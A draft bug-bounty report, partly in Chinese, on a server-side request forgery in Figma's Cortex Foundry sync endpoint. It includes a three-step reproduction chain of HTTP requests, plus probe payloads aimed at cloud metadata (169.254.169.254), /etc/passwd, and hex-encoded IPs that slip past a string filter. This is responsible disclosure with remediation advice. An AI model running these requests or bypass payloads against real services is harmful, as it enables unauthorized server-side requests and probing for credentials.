# foundry sync downloadUrl — SSRF 报告草稿(2026-08-12)

> 状态:草稿,待用户审阅
> 评级评估:Low–Medium(公网 fetch 成立,内网/云元数据隔离——如实标注)

---

## Title

**Server-Side Request Fetch (SSRF) via `foundry/sync` `downloadUrl` — arbitrary public URL fetched by Figma backend with full response exfiltration**

## Summary

Authenticated Figma users can cause the Figma backend to fetch arbitrary public HTTP(S) URLs via the `downloadUrl` field of the Cortex Foundry `sync` endpoint. The fetched response is written into the sandbox VFS and can be fully read back through `fs-snapshot`. This allows a user to make requests from Figma's server-side network egress (e.g. to bypass IP-based access restrictions, reach geo/IP-allowlisted resources, or probe Figma's egress IP space). Private-network targets (RFC1918, loopback, cloud metadata) are currently isolated at the network layer, but the server-side fetch primitive itself is confirmed.

## Affected Endpoints

```
POST /api/cortex/foundry/sandbox          (obtain sboxdUrl)
POST /api/cortex/foundry/sync             (downloadUrl → server-side fetch)
POST /api/cortex/foundry/fs-snapshot      (exfiltrate fetched content)
```

All endpoints require the `X-Figma-File-Key` header set to any file the attacker can access with AI enabled (including link-shared files). Schema confirmed from the official frontend bundle (`1037-5e6059a4815311b3.min.js`, module 136858):

```js
w = z.union([S, T])
S = z.object({path, contents, metadata:E})        // inline contents
T = z.object({path, downloadUrl, metadata:E})     // server-side fetch of downloadUrl
k = z.union([{type:literal("upsert"), entry:w}, {type:literal("delete"), entry:C}])
```

## Steps To Reproduce

1. **Create a sandbox** (any file the attacker can open, e.g. a link-shared file):

```
POST https://www.figma.com/api/cortex/foundry/sandbox
Headers: Cookie: <session> | X-Figma-User-ID: <uid> | X-Figma-File-Key: <accessible-file-key>
Body: {}
→ 200 {"state":"running","sboxdUrl":"https://sboxd-....makeproxy-c.figma.site",...}
```

2. **Trigger the server-side fetch**:

```
POST https://www.figma.com/api/cortex/foundry/sync
Headers: (same as above)
Body: {
  "vfsChangeByPath": {
    "k": {"type":"upsert",
          "entry": {"path":"code/DL0.txt",
                    "downloadUrl":"https://httpbin.org/robots.txt",
                    "metadata":{"version":"1","guid":"g1"}}}
  },
  "entrypointsByIdentifier": {}
}
→ 200 {"syncTotalDuration":388,"fileSyncDuration":382,...}
```

3. **Read the fetched content back**:

```
POST https://www.figma.com/api/cortex/foundry/fs-snapshot
Headers: (same as above)
Body: {"sboxdUrl":"<from step 1>","path":"code/src/code/DL0.txt","options":{"content":"snapshot"}}
→ SSE stream, content field (base64) decodes to: "User-agent: *\nDisallow: /deny\n"
```

## Evidence

| Target URL | Result | Latency | Meaning |
|---|---|---|---|
| `https://httpbin.org/robots.txt` | ✅ content exfiltrated | ~382ms | real server-side fetch |
| `file:///etc/passwd` | ❌ rejected | ~0ms | non-http(s) scheme blocked |
| `http://169.254.169.254/latest/meta-data/` | ❌ | ~13ms | literal IP pre-check |
| `http://0xa9fea9fe/latest/meta-data/` (hex-encoded) | ❌ | ~13ms | bypasses string check, still isolated |
| `http://127.0.0.1:8080/`, `http://0x7f000001:8000..10250` | ❌ | 1.5s connect timeout | no service reachable |
| redirect `httpbin → 169.254.169.254` | ❌ | 94ms | redirects still isolated |
| `http://169.254.169.254.nip.io` | ❌ | 420ms | DNS ok, connect fails |

**Key observations**
- Literal private IPs are rejected by a pre-check, but **hex/octal-encoded IPs pass the pre-check** and reach the real connection path (1.5s connect timeout) — only the network layer isolates them.
- Cloud metadata (AWS IMDS, GCP, ECS) is **not reachable** from the fetch environment.
- Arbitrary **public** URLs are fetched server-side with full response exfiltration.

## Impact

- **Server-side request primitive**: requests originate from Figma's backend egress; usable to access resources restricted by IP allowlist, geo-blocking, or WAF rules, and to fingerprint Figma egress IP ranges.
- **Content injection into sandbox VFS**: arbitrary fetched bytes land in the user's sandbox filesystem (limited to attacker's own sandbox).
- If Figma's fetch environment ever gains internal network reachability, this escalates to internal network scanning / cloud-credential access — the fetch primitive is already in place.

Severity: **Low–Medium** (honest assessment: internal network and cloud metadata are currently unreachable; the confirmed primitive is public-URL fetch with exfiltration).

## Remediation

- Restrict `downloadUrl` schemes and hosts (allowlist only Figma-owned storage domains).
- Route the fetch through an egress-isolated proxy with no access to private ranges (network-layer, not just string filtering — hex/octal encodings already bypass string checks).
- Consider removing the `downloadUrl` variant entirely; inline `contents` already covers legitimate sync use.

---

## 中文要点(提交前自检)

- [ ] 复现链 3 步,全部用 B 账号(B 对公开文件 bv2nMIdFf4u3dESGail4sm 可访问)实测通过
- [ ] 诚实评级 Low-Medium:内网/IMDS 不可达,不夸大
- [ ] 风险:Figmas 可能回复 "by design"(Make 工作流本就允许沙箱下载 URL);若沙箱内用户可自行 curl,则该面价值 ≈ Informational
- [ ] 是否提交由用户决定;若提交建议定位 "server-side egress primitive + encoded-IP bypass of string filter"
